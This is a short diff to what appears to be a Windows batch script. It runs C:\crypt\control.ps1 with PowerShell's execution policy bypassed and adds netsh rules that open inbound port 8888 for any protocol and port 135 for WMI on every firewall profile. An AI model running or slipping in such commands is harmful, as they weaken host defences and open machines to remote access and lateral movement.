@@ -1,1 +1,7 @@
 powershell -ExecutionPolicy Bypass -File "C:\crypt\control.ps1"
+
+
+
+:: Buka Firewall untuk SEMUA Profile (Domain, Private, Public) agar lebih sakti
+netsh advfirewall firewall add rule name="Allow P2P Everything" dir=in action=allow protocol=ANY localport=8888 profile=any
+netsh advfirewall firewall add rule name="Allow WMI" dir=in action=allow protocol=TCP localport=135 profile=any
